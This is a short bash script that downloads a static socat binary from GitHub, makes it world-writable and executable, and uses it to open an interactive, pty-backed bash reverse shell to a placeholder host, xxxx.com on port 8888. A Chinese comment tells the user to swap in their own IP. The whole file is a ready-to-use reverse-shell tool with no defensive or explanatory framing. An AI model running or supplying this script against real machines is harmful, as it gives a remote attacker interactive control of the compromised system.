#!/bin/bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmod 7777 socat

# xxxx.com记得换成自己ip
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xxxx.com:8888
